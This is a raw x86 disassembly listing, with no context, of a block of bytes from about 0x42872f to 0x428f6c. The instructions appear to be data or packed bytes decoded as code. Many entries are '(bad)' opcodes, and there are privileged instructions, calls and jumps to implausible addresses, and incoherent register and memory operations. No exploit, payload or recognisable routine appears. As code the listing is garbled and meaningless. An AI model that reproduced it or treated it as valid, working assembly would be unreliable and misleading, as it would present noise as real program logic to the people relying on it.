  42872f:	jb     0x428731
  428731:	mov    al,0x10
  428733:	push   eax
  428734:	add    al,0x75
  428736:	add    BYTE PTR [ebx],ch
  428738:	add    ebx,esp
  42873a:	int3   
  42873b:	jne    0x42874d
  42873d:	movsx  edx,cl
  428740:	add    DWORD PTR [eax],eax
  428742:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  428749:	mov    gs,edi
  42874b:	add    BYTE PTR [eax-0x50],ch
  42874e:	add    al,ch
  428750:	mov    eax,DWORD PTR [ecx]
  428752:	sub    eax,DWORD PTR [eax]
  428754:	jb     0x4287cb
  428756:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42875a:	jge    0x428744
  42875c:	add    al,0x1
  42875e:	add    DWORD PTR [eax],0x0
  428761:	jne    0x428763
  428763:	je     0x4287aa
  428765:	mov    eax,DWORD PTR [edi]
  428767:	ror    BYTE PTR [ebp+0x4d],1
  42876a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  428771:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  428777:	mov    DWORD PTR [ebx],ebp
  428779:	fadd   DWORD PTR [eax+0x75]
  42877c:	inc    eax
  42877d:	pop    eax
  42877e:	lea    ebx,[ecx+0x4f]
  428781:	push   0xb1000003
  428786:	out    dx,eax
  428787:	add    ebp,DWORD PTR [edx+edx*2]
  42878a:	add    BYTE PTR [ebx+ecx*4],bh
  42878d:	mov    ch,BYTE PTR [ebx]
  42878f:	jb     0x428803
  428791:	add    al,0x89
  428793:	push   eax
  428794:	call   0x842ad506
  428799:	add    DWORD PTR [eax+eax*1],eax
  42879c:	jae    0x4287b2
  42879e:	icebp  
  42879f:	inc    ebp
  4287a0:	mov    eax,DWORD PTR gs:[ecx]
  4287a3:	int3   
  4287a4:	out    dx,al
  4287a5:	loopne 0x4287f4
  4287a7:	sub    eax,DWORD PTR [edx]
  4287a9:	push   0xffffff83
  4287ab:	pop    esi
  4287ac:	push   cs
  4287ad:	jl     0x4287c8
  4287af:	add    al,0xaf
  4287b1:	xor    eax,0x832b6d00
  4287b6:	mov    eax,DWORD PTR [edx]
  4287b8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4287be:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4287c4:	inc    ebp
  4287c5:	shr    ebx,0x3
  4287c8:	or     DWORD PTR [eax],0x4
  4287cb:	push   0xffffffa5
  4287cd:	pop    esi
  4287ce:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4287d5:	jmp    0x428834
  4287d7:	mov    edi,0xff0272
  4287dc:	fdivr  QWORD PTR [ebp+0x5d]
  4287df:	push   0x4e
  4287e1:	pop    ecx
  4287e2:	call   0x42cbe7
  4287e7:	mov    DWORD PTR [ebx],eax
  4287e9:	in     al,0xc8
  4287eb:	rol    BYTE PTR [ebp-0x75],0xc1
  4287ef:	call   0xac89d0
  4287f4:	pop    esi
  4287f5:	enter  0xceff,0x8b
  4287f9:	repz mov ecx,DWORD PTR [ebp-0x34]
  4287fd:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428804:	je     0x428806
  428806:	or     DWORD PTR [ebx-0x74183b24],eax
  42880c:	jne    0x4287f2
  42880e:	jmp    0x428809
  428810:	push   DWORD PTR [edx-0x24]
  428813:	push   0x4d
  428815:	pop    ecx
  428816:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42881a:	jge    0x428822
  42881c:	mov    eax,eax
  42881e:	sub    ebp,DWORD PTR [edx+0x24]
  428821:	pop    esi
  428822:	inc    ebp
  428823:	mov    esp,0x8b6077
  428828:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42882e:	lods   al,BYTE PTR ds:[esi]
  42882f:	add    BYTE PTR [ebx],bh
  428831:	enter  0xce73,0x49
  428835:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42883d:	stc    
  42883e:	jge    0x4288b2
  428840:	jnp    0xdd420baf
  428846:	call   0xc5891c
  42884b:	fadd   st(0),st
  42884d:	dec    esi
  42884e:	ins    BYTE PTR es:[edi],dx
  42884f:	stc    
  428850:	cmp    al,0x73
  428852:	push   ebp
  428853:	mov    eax,0xf8028b
  428858:	jne    0x42881b
  42885a:	mov    esi,ecx
  42885c:	mov    esp,DWORD PTR [ebp+0x2c]
  42885f:	add    edi,DWORD PTR [ebp-0x24]
  428862:	sub    esp,eax
  428864:	and    al,0x45
  428866:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42886c:	sbb    al,0xee
  42886e:	pop    esi
  42886f:	call   0x82889f
  428874:	fsubr  st,st(3)
  428876:	sti    
  428877:	add    BYTE PTR gs:[ecx],bh
  42887a:	add    eax,esp
  42887c:	add    DWORD PTR [esi],eax
  42887e:	rol    DWORD PTR [ebp+0x8],0x29
  428882:	mov    esp,eax
  428884:	clc    
  428885:	jne    0x4288fc
  428887:	mov    eax,0x8b0673
  42888c:	loopne 0x4288d3
  42888e:	loopne 0x428819
  428890:	lods   al,BYTE PTR ds:[esi]
  428891:	int3   
  428892:	inc    ebp
  428893:	mov    DWORD PTR gs:[eax+edi*8],eax
  428897:	add    al,0xc3
  428899:	sub    ecx,DWORD PTR [ebp+0x47]
  42889c:	(bad)  
  42889e:	shr    BYTE PTR [ebp-0x1f],0xe8
  4288a2:	add    eax,DWORD PTR [eax]
  4288a4:	call   0x64449a9
  4288a9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4288af:	dec    esi
  4288b0:	ins    DWORD PTR es:[edi],dx
  4288b1:	in     al,dx
  4288b2:	lea    eax,[eax]
  4288b4:	inc    ebp
  4288b5:	inc    ebp
  4288b6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4288bc:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4288c6:	and    al,0xdc
  4288c8:	ror    DWORD PTR [edx+0x24],0xf7
  4288cc:	or     BYTE PTR [ebp+0x4c],dh
  4288cf:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4288d3:	stos   BYTE PTR es:[edi],al
  4288d4:	adc    edx,edi
  4288d6:	inc    esp
  4288d7:	add    edi,DWORD PTR [eax]
  4288d9:	jne    0x4288be
  4288db:	mov    DWORD PTR [eax-0x7449db04],ecx
  4288e1:	cmp    ecx,DWORD PTR [edi]
  4288e3:	sub    BYTE PTR [ebp-0x7e],dl
  4288e6:	sar    ebp,0xb
  4288e9:	jmp    FWORD PTR [edi+0x2400392a]
  4288ef:	sub    esi,DWORD PTR [ebx-0x73]
  4288f2:	mov    esp,DWORD PTR [ecx+edi*4]
  4288f5:	mov    ecx,DWORD PTR [eax]
  4288f7:	and    BYTE PTR [eax],al
  4288f9:	jne    0x4288c5
  4288fb:	sub    ebp,ecx
  4288fd:	sbb    BYTE PTR [esi+0x32],ah
  428900:	dec    ebp
  428901:	push   ebp
  428902:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428908:	ret    
  428909:	mov    edx,ebp
  42890b:	leave  
  42890c:	sub    DWORD PTR [esi+0x24],ebx
  42890f:	ret    0x2b
  428912:	pop    ax
  428914:	push   ebp
  428915:	rol    BYTE PTR [ebx],0xeb
  428918:	add    DWORD PTR [ecx+0x6c0001],0x40
  42891f:	jb     0x428976
  428921:	ret    
  428922:	in     al,dx
  428923:	jecxz  0x4288b0
  428925:	push   esi
  428926:	xchg   esp,eax
  428927:	jne    0x428929
  428929:	cmp    edx,DWORD PTR [esi+0x1c]
  42892c:	jne    0x428912
  42892e:	mov    eax,DWORD PTR [ebp-0x77]
  428931:	ror    DWORD PTR [ebx+0x899408],0xe0
  428938:	mov    esi,DWORD PTR [ebp-0x75]
  42893b:	pop    esi
  42893c:	nop
  42893d:	mov    eax,DWORD PTR [eax]
  42893f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  428945:	add    al,0x0
  428947:	inc    ebp
  428948:	mov    eax,DWORD PTR [ebx]
  42894a:	mov    ebp,ebx
  42894c:	cmp    al,0xf
  42894e:	or     al,al
  428950:	inc    ebp
  428951:	inc    ebp
  428952:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  428958:	cld    
  428959:	add    BYTE PTR [edi+0x506c16c0],dh
  42895f:	add    BYTE PTR [ecx-0x5],dl
  428962:	add    eax,0x17200
  428967:	sbb    al,0x85
  428969:	dec    esp
  42896a:	je     0x4289a4
  42896c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  428970:	add    BYTE PTR [ebx],bh
  428972:	(bad)  
  428973:	and    al,0x39
  428975:	jae    0x428913
  428977:	mov    cl,cl
  428979:	inc    DWORD PTR [esp]
  42897c:	push   ebp
  42897d:	shr    esp,0x8
  428980:	in     al,dx
  428981:	push   esp
  428982:	add    DWORD PTR [eax],esp
  428984:	add    bl,cl
  428986:	inc    ebp
  428987:	mov    bh,0x89
  428989:	add    ah,bh
  42898b:	jmp    0xca7b98d5
  428990:	pushf  
  428991:	dec    esp
  428992:	mov    edx,0xf8178520
  428997:	fst    DWORD PTR [ebp+0x0]
  42899a:	mov    BYTE PTR [eax],0xc4
  42899d:	sub    edx,DWORD PTR [ebx-0x3f]
  4289a0:	inc    ebp
  4289a1:	add    eax,0xc601dc
  4289a6:	mov    al,0xc6
  4289a9:	ins    BYTE PTR es:[edi],dx
  4289aa:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  4289b1:	dec    esp
  4289b2:	jmp    DWORD PTR [eax]
  4289b4:	inc    ebp
  4289b5:	fnstcw WORD PTR [eax+0x29]
  4289b8:	test   BYTE PTR [eax],0xc5
  4289bb:	rol    BYTE PTR [eax],0xc0
  4289be:	lea    ecx,[ebp-0x3cf0dbcb]
  4289c4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4289ca:	inc    esi
  4289cb:	add    DWORD PTR [eax],ebx
  4289cd:	add    dh,bh
  4289cf:	mov    esi,DWORD PTR [edx+0x8]
  4289d2:	(bad)  
  4289d3:	fdiv   QWORD PTR ss:[ecx]
  4289d6:	(bad)  
  4289d7:	mov    bl,ch
  4289d9:	add    esi,eax
  4289db:	add    dh,bl
  4289dd:	or     esi,eax
  4289df:	mov    dl,0xdf
  4289e1:	add    esi,eax
  4289e3:	add    al,ah
  4289e5:	push   cs
  4289e6:	mov    BYTE PTR [edx+0xc601e1],0xe2
  4289ed:	or     BYTE PTR [ebx],dh
  4289ef:	dec    ecx
  4289f0:	lea    eax,[ebx]
  4289f2:	xor    eax,0x18fc0fc7
  4289f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289f8:	repz clc 
  4289fa:	add    eax,DWORD PTR [ebp+0x46]
  4289fd:	prefetcht0 BYTE PTR [ecx-0x2]
  428a01:	xor    eax,0x7c60872
  428a06:	mov    esp,0xbd32c698
  428a0b:	pop    esi
  428a0c:	mov    cl,0xbe
  428a0f:	or     al,0xc6
  428a11:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428a18:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  428a1f:	add    dh,al
  428a21:	mov    eax,ebx
  428a23:	xor    DWORD PTR [ebx],0x35008dbc
  428a29:	mov    ecx,DWORD PTR [edi]
  428a2b:	sbb    al,0x18
  428a2d:	inc    ebp
  428a2e:	xrelease mov DWORD PTR [ebx],0x188546f4
  428a35:	clc    
  428a36:	(bad)  
  428a37:	cmp    BYTE PTR [edx-0x64],dh
  428a3a:	lea    ecx,[ecx+0x45ffe838]
  428a40:	mov    ecx,esp
  428a42:	fadd   st,st(6)
  428a44:	dec    ebp
  428a45:	lds    edi,FWORD PTR [eax+0x7145fc56]
  428a4b:	out    0x1,eax
  428a4d:	inc    ebp
  428a4e:	lea    ebp,ds:0xc8ffc6ff
  428a54:	enter  0xa33,0xc6
  428a58:	push   ebp
  428a59:	leave  
  428a5a:	(bad)  
  428a5b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  428a61:	add    BYTE PTR [ebp+0x44],al
  428a64:	mov    eax,esp
  428a66:	mov    WORD PTR [esi+0x43398300],?
  428a6c:	psubusw mm4,QWORD PTR [eax-0x78]
  428a70:	add    BYTE PTR [ebx-0x1303f975],al
  428a76:	add    BYTE PTR [ebp+0x1],0xf3
  428a7a:	add    BYTE PTR [ebp+0x38],al
  428a7d:	in     eax,dx
  428a7e:	inc    ebp
  428a7f:	inc    ebp
  428a80:	mov    esp,ebx
  428a82:	add    BYTE PTR [ebp+0x0],0xee
  428a86:	mov    DWORD PTR [ebp-0x48],eax
  428a89:	sub    eax,0x2e00454f
  428a8e:	js     0x428ad5
  428a90:	data16 js 0x428a18
  428a93:	idiv   bh
  428a95:	inc    esp
  428a96:	(bad)  
  428a97:	fadd   st(7),st
  428a99:	mov    dh,0x89
  428a9b:	and    DWORD PTR [esi+0x43],0xffffffff
  428a9f:	fld    DWORD PTR [ebx-0x767cc078]
  428aa5:	pop    es
  428aa6:	push   0x8d45ffec
  428aab:	in     eax,dx
  428aac:	inc    DWORD PTR [ebp-0x77]
  428aaf:	loopne 0x428b1b
  428ab1:	inc    ebp
  428ab2:	jmp    esp
  428ab4:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428ab8:	mov    DWORD PTR [ebp+0x6c],eax
  428abb:	(bad)  
  428abd:	inc    ebp
  428abe:	(bad)  
  428abf:	call   0xe7cbcfd0
  428ac4:	outs   dx,BYTE PTR ds:[esi]
  428ac5:	inc    ebp
  428ac6:	(bad)  
  428ac7:	js     0x428a4c
  428ac9:	div    BYTE PTR ds:0x70bc8944
  428acf:	mov    dh,0xff
  428ad1:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428ad8:	jb     0x428a5d
  428ada:	dec    DWORD PTR [eax]
  428adc:	mov    ebp,esp
  428ade:	test   WORD PTR [ebp-0x1],ax
  428ae5:	inc    ebp
  428ae6:	ror    BYTE PTR [ebx-0x117a279a],0xff
  428aed:	adc    edi,edi
  428aef:	mov    ecx,esi
  428af1:	mov    eax,DWORD PTR [eax]
  428af3:	cmp    BYTE PTR [esi-0x1],ah
  428af6:	test   DWORD PTR [ebx],edi
  428af8:	push   DWORD PTR [ebp-0x1]
  428afb:	mov    DWORD PTR [esi-0x48],ebp
  428afe:	add    BYTE PTR [ebp+0x66],al
  428b01:	jmp    0x428a88
  428b03:	pushf  
  428b04:	dec    DWORD PTR [ebx-0x7f9c0301]
  428b0a:	add    BYTE PTR [ecx],al
  428b0c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428b13:	add    al,al
  428b15:	add    BYTE PTR [esi+0x45],ah
  428b18:	test   DWORD PTR [ebx+0xff7cff],ecx
  428b1e:	dec    esp
  428b1f:	mov    DWORD PTR [eax],eax
  428b21:	mov    esp,DWORD PTR [esi-0x4]
  428b24:	inc    ebp
  428b25:	cmp    BYTE PTR [eax+0x4701],0x38
  428b2c:	mov    DWORD PTR [ecx-0x7e],esp
  428b2f:	add    BYTE PTR [edi-0x73],al
  428b32:	push   0xffffffd1
  428b34:	mov    WORD PTR [ebp+0x64],ax
  428b38:	(bad)  
  428b39:	call   eax
  428b3b:	mov    esp,eax
  428b3d:	data16 icebp 
  428b3f:	test   DWORD PTR [ebp-0x1],eax
  428b42:	(bad)  
  428b44:	out    0xc0,eax
  428b46:	lea    esp,[esi-0x30]
  428b49:	test   DWORD PTR [edx+0x43ff80ff],ecx
  428b4f:	inc    edi
  428b50:	jmp    0x75ff:0x40858866
  428b57:	dec    DWORD PTR [ebp-0x7a992f40]
  428b5d:	test   esi,edi
  428b5f:	(bad)  
  428b60:	(bad)  
  428b61:	inc    DWORD PTR [ebp-0x9901b9]
  428b67:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  428b6d:	rcl    BYTE PTR [ecx+0x66],0x33
  428b71:	test   DWORD PTR [ebx+0xff72ff],edi
  428b77:	inc    edi
  428b78:	ret    
  428b79:	mov    ax,WORD PTR [ebp-0x3f0004]
  428b80:	push   eax
  428b81:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428b88:	add    BYTE PTR [ebx-0x764ff439],al
  428b8e:	push   DWORD PTR [esi+0x1]
  428b91:	inc    DWORD PTR [eax]
  428b93:	mov    eax,0xff99ff
  428b98:	or     BYTE PTR [ecx-0x7a87bb],cl
  428b9e:	jne    0x428b58
  428ba0:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  428baa:	mov    ecx,0xd74fb8
  428baf:	add    cl,al
  428bb1:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428bb7:	or     DWORD PTR [ebx+0x558966ec],0x7e
  428bbe:	(bad)  
  428bbf:	push   ebp
  428bc1:	mov    eax,0x8c2789
  428bc6:	ret    0x6689
  428bc9:	adc    BYTE PTR [ebp+0x4c],0x8d
  428bcd:	add    bl,bl
  428bcf:	mov    WORD PTR [ebp-0x70],ax
  428bd3:	(bad)  
  428bd4:	ret    0x660d
  428bd7:	or     BYTE PTR [ebp-0x77],dl
  428bda:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428be1:	in     al,0x89
  428be3:	(bad)  
  428be4:	xchg   esi,eax
  428be5:	aam    0xcf
  428be7:	call   0x45db0475
  428bec:	dec    edx
  428bed:	pop    ecx
  428bee:	mov    edx,DWORD PTR [eax]
  428bf0:	repnz push bp
  428bf3:	or     BYTE PTR [ebx+0x5510663b],0x49
  428bfa:	(bad)  
  428bfb:	repnz xor eax,0xa0898945
  428c01:	mov    ah,0x89
  428c03:	jmp    DWORD PTR [edx+0x66b0418d]
  428c09:	inc    DWORD PTR [ebp+0x50]
  428c0c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428c10:	mov    DWORD PTR [eax],ecx
  428c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c13:	pop    es
  428c14:	inc    ecx
  428c15:	(bad)  
  428c16:	cbw    
  428c18:	inc    ebp
  428c19:	xor    ah,BYTE PTR [esi+0x3]
  428c1c:	dec    ebp
  428c1d:	push   eax
  428c1e:	inc    bp
  428c20:	jge    0x428ba5
  428c22:	mov    esp,DWORD PTR [esi-0x18]
  428c25:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  428c2b:	add    DWORD PTR [ebx],esi
  428c2d:	add    BYTE PTR [ebx],al
  428c2f:	test   DWORD PTR [ebx],esi
  428c31:	(bad)  
  428c32:	inc    WORD PTR [ebp+0x0]
  428c36:	mov    eax,DWORD PTR [eax]
  428c38:	call   0x8898436d
  428c3d:	mov    esi,eax
  428c3f:	clc    
  428c40:	ret    
  428c41:	rol    cl,0xa
  428c44:	mov    DWORD PTR ds:0x7c0ec88,esi
  428c4a:	mov    edx,edi
  428c4c:	pushf  
  428c4d:	pop    es
  428c4e:	jmp    FWORD PTR [edx+0x66]
  428c51:	add    BYTE PTR [ebp-0x990175],al
  428c57:	inc    ebp
  428c58:	test   DWORD PTR [ebx-0x2f000202],eax
  428c5e:	push   ebp
  428c5f:	mov    edi,eax
  428c61:	mov    dh,BYTE PTR [eax+0x266ff51]
  428c67:	push   ebp
  428c68:	add    BYTE PTR [ebx-0x764b1777],al
  428c6e:	dec    DWORD PTR [esi+0x661851e8]
  428c74:	add    BYTE PTR [ebp-0x7b],dl
  428c77:	cmp    esi,0xfffffffb
  428c7a:	dec    DWORD PTR [ecx+0x51fe9285]
  428c80:	jmp    DWORD PTR [esi-0x75]
  428c83:	push   ebp
  428c84:	hlt    
  428c85:	data16 (bad) 
  428c87:	dec    ebp
  428c88:	ret    
  428c89:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  428c8f:	lea    edx,[eax-0x1]
  428c92:	jne    0x428c65
  428c94:	dec    DWORD PTR [ecx-0x2f7a63f8]
  428c9a:	dec    BYTE PTR [ecx+0x51559eff]
  428ca0:	mov    DWORD PTR [esi-0x4c],esp
  428ca3:	push   ebp
  428ca4:	jmp    DWORD PTR [esi-0x18]
  428ca7:	inc    ebp
  428ca8:	sbb    BYTE PTR [ebp-0x767ae500],cl
  428cae:	(bad)  
  428caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428cb0:	inc    eax
  428cb2:	test   DWORD PTR [esi-0x2],esp
  428cb5:	inc    ebp
  428cb6:	dec    DWORD PTR [ebp-0x760bde75]
  428cbc:	(bad)  
  428cbd:	test   al,0xc3
  428cbf:	mov    DWORD PTR [ebp-0x769b56],ecx
  428cc5:	lods   al,BYTE PTR ds:[esi]
  428cc6:	push   eax
  428cc7:	inc    ebp
  428cc8:	jne    0x428cd9
  428cca:	dec    DWORD PTR [ebp+0x8]
  428ccd:	mov    eax,DWORD PTR [edi]
  428ccf:	sbb    al,0x0
  428cd1:	(bad)  
  428cd2:	mov    eax,0xc14fc3
  428cd7:	mov    DWORD PTR [eax-0x64],edi
  428cda:	inc    bp
  428cdc:	test   DWORD PTR [edi],ecx
  428cde:	dec    DWORD PTR [ebp-0x1]
  428ce1:	xor    eax,edi
  428ce3:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428ce9:	inc    ebp
  428cea:	xor    DWORD PTR [ebx],0x3f
  428ced:	mov    WORD PTR [ebp-0x1bc],ax
  428cf4:	lea    ecx,[ecx-0x767702]
  428cfa:	inc    esi
  428cfb:	(bad)  
  428cfc:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428d03:	pushf  
  428d04:	rol    DWORD PTR [ebp-0x72019a],0xff
  428d0b:	add    bh,bh
  428d0d:	add    BYTE PTR [edi],cl
  428d0f:	test   DWORD PTR [eax],eax
  428d11:	(bad)  
  428d12:	dec    WORD PTR [ebp-0xff002d]
  428d19:	mov    DWORD PTR [eax+edi*4+0x0],edi
  428d1d:	jmp    DWORD PTR [esi-0x73]
  428d20:	lea    esi,[eax+0x50ffffff]
  428d26:	fadd   QWORD PTR [ebp+0x0]
  428d29:	xor    esp,DWORD PTR [esi+0x3]
  428d2c:	lea    edx,[eax-0x1]
  428d2f:	test   edi,edi
  428d31:	dec    DWORD PTR [ebp-0x1]
  428d34:	mov    edi,edi
  428d36:	dec    eax
  428d37:	clc    
  428d38:	call   DWORD PTR [ebp-0x73]
  428d3b:	lea    esi,[eax+0x51ffff88]
  428d41:	lea    ecx,[ebp-0x78]
  428d44:	test   WORD PTR [ebp-0x2],ax
  428d4b:	popf   
  428d4c:	push   eax
  428d4d:	add    BYTE PTR [ecx-0x77],dl
  428d50:	xor    edi,DWORD PTR [eax-0x7236007d]
  428d56:	cwde   
  428d57:	mov    al,0x32
  428d59:	inc    DWORD PTR [ebx]
  428d5b:	push   eax
  428d5c:	push   ecx
  428d5d:	inc    ebp
  428d5e:	shl    BYTE PTR [ebx],1
  428d60:	lea    eax,[ebx]
  428d62:	call   DWORD PTR [eax-0x1]
  428d65:	test   DWORD PTR [ebx],esi
  428d67:	inc    DWORD PTR [eax-0x1]
  428d6a:	(bad)  
  428d6b:	(bad)  
  428d6c:	(bad)  
  428d6d:	clc    
  428d6e:	call   DWORD PTR [ebp+0x50]
  428d71:	jmp    0xcb8eeb
  428d76:	inc    esp
  428d77:	jnp    0x428d78
  428d79:	add    BYTE PTR [ecx-0x484f73],cl
  428d7f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428d85:	mov    eax,DWORD PTR [ecx]
  428d87:	data16 add BYTE PTR [ebp-0xb50077],al
  428d8e:	inc    eax
  428d90:	lea    esp,[esi+0x14]
  428d93:	test   DWORD PTR [ecx-0xb301],ecx
  428d99:	inc    edi
  428d9a:	(bad)  
  428d9b:	dec    si
  428d9d:	test   edi,edi
  428d9f:	(bad)  
  428da0:	cmp    eax,0xc74f73ff
  428da5:	mov    edx,DWORD PTR [edx-0x7d]
  428da8:	push   DWORD PTR [ebx+0x56328939]
  428dae:	(bad)  
  428daf:	call   FWORD PTR [esi-0x47]
  428db2:	inc    DWORD PTR ds:0x893c00ea
  428db8:	(bad)  
  428db9:	pop    eax
  428dba:	mov    ah,0xff
  428dbc:	(bad)  
  428dbd:	mov    ecx,0x5745
  428dc2:	dec    DWORD PTR [ecx-0xf7a501]
  428dc8:	(bad)  
  428dc9:	mov    ecx,0x456108
  428dce:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428dd4:	test   BYTE PTR [ebp-0x72ff23fd],cl
  428dda:	inc    BYTE PTR gs:[eax]
  428ddd:	inc    DWORD PTR [ebp-0x73]
  428de0:	cmp    dh,bh
  428de2:	pushf  
  428de3:	inc    edi
  428de5:	mov    ebx,eax
  428de7:	hlt    
  428de8:	test   DWORD PTR [ecx-0xbab708],ecx
  428dee:	cmp    al,0xbe
  428df0:	pushf  
  428df1:	or     bh,al
  428df3:	pop    es
  428df4:	lock into 
  428df6:	test   eax,eax
  428df8:	clc    
  428df9:	mov    ebx,0x387245
  428dfe:	lahf   
  428dff:	retf   
  428e00:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428e06:	add    edi,edi
  428e08:	add    BYTE PTR [ecx+0x45],dl
  428e0b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428e12:	mov    edx,DWORD PTR [ecx-0x74]
  428e15:	inc    DWORD PTR [eax]
  428e17:	cld    
  428e18:	mov    eax,DWORD PTR [ebp-0x6f0175]
  428e1e:	add    BYTE PTR [ebp-0x1b0177],al
  428e24:	jge    0x428e6b
  428e26:	test   DWORD PTR [ebx+0xff9875],ecx
  428e2c:	sbb    BYTE PTR [esi+0x55],ah
  428e2f:	xchg   ebp,eax
  428e30:	call   0x428934
  428e35:	push   edi
  428e36:	inc    ebp
  428e37:	mov    dx,WORD PTR [ebp-0xfc0075]
  428e3e:	cmp    al,0x85
  428e40:	ud0    eax,DWORD PTR [ebp-0x1]
  428e44:	test   DWORD PTR [edi+0x74],ecx
  428e47:	dec    edi
  428e48:	inc    DWORD PTR [ebp-0xf70004]
  428e4e:	dec    DWORD PTR [edi-0x75]
  428e51:	dec    edi
  428e52:	cld    
  428e53:	test   DWORD PTR [eax+0xff01ff],eax
  428e59:	icebp  
  428e5a:	add    BYTE PTR [edi-0x3a],cl
  428e5d:	test   ebx,eax
  428e5f:	inc    BYTE PTR [ebp-0x1]
  428e62:	jne    0x428e64
  428e64:	mov    eax,DWORD PTR [eax]
  428e66:	cld    
  428e67:	xor    BYTE PTR [ecx+0x500155],cl
  428e6d:	push   ebp
  428e6e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428e74:	add    BYTE PTR [ebp+0x35e90f50],al
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428e82:	add    ah,ch
  428e84:	or     BYTE PTR [ebp+0x4501f845],dh
  428e8a:	jmp    0xde9187
  428e8f:	(bad)  
  428e90:	nop    ecx
  428e93:	test   DWORD PTR [ebp+0x4502f8],eax
  428e99:	cmp    cl,BYTE PTR [ebp-0x64]
  428e9c:	mov    eax,edi
  428e9e:	mov    ebx,DWORD PTR [eax+edx*2]
  428ea1:	add    eax,0x45fef885
  428ea6:	dec    DWORD PTR [ebx+0x339445]
  428eac:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428eb2:	dec    DWORD PTR [ebx-0x460f0375]
  428eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428eb9:	add    esi,edi
  428ebb:	add    bh,bh
  428ebd:	rdpmc  
  428ebf:	add    BYTE PTR [ebx],0x1
  428ec2:	mov    DWORD PTR [eax],eax
  428ec4:	add    al,0x45
  428ec6:	dec    DWORD PTR [ecx-0x360b3373]
  428ecc:	dec    DWORD PTR [esi]
  428ece:	push   eax
  428ecf:	jne    0x428f16
  428ed1:	mov    esi,DWORD PTR [ebx]
  428ed3:	cld    
  428ed4:	add    ebp,ebx
  428ed6:	push   eax
  428ed7:	inc    DWORD PTR [ebp-0x75]
  428eda:	add    eax,0x800e4
  428edf:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428ee5:	mov    DWORD PTR [ecx],eax
  428ee7:	sbb    al,0x0
  428ee9:	leave  
  428eea:	test   DWORD PTR [edi-0x2],eax
  428eed:	jne    0x428eee
  428eef:	call   0xff4379f4
  428ef4:	xor    BYTE PTR [ebp+0x4d],al
  428ef7:	mov    edi,edi
  428ef9:	enter  0x8,0x4d
  428efd:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428f03:	mov    eax,DWORD PTR [eax]
  428f05:	cld    
  428f06:	add    DWORD PTR [ecx],ebx
  428f08:	inc    ebp
  428f09:	dec    ebp
  428f0a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428f10:	inc    eax
  428f11:	dec    DWORD PTR [ecx-0x270375]
  428f17:	add    BYTE PTR [ebx-0x39d72701],cl
  428f1d:	xchg   ecx,eax
  428f1e:	ret    
  428f1f:	add    BYTE PTR [ebp-0x830075],al
  428f25:	add    BYTE PTR [ebp-0x75],al
  428f28:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  428f2e:	lea    edi,[edi-0xc]
  428f31:	add    bh,bh
  428f33:	mov    edx,DWORD PTR [eax-0x7b]
  428f36:	inc    ebp
  428f37:	rdpmc  
  428f39:	jne    0x428f3e
  428f3b:	add    BYTE PTR [eax-0x75],dl
  428f3e:	inc    ebp
  428f3f:	clc    
  428f40:	add    eax,0x400009
  428f45:	mov    DWORD PTR [ebx-0x7f000304],ecx
  428f4b:	mov    eax,DWORD PTR [ecx]
  428f4d:	in     al,dx
  428f4e:	add    dh,al
  428f50:	test   ebx,eax
  428f52:	inc    BYTE PTR [ebp-0xff0001]
  428f58:	add    BYTE PTR [ebp-0x43],al
  428f5b:	cmp    esi,0xfffffff8
  428f5e:	(bad)  
  428f5f:	push   DWORD PTR [eax]
  428f61:	add    BYTE PTR [ebp-0x3a],dl
  428f64:	test   ebx,eax
  428f66:	je     0x428eed
  428f68:	mov    edi,edi
  428f6a:	sbb    al,0xff
  428f6c:	test   DWORD PTR gs:[eax],eax
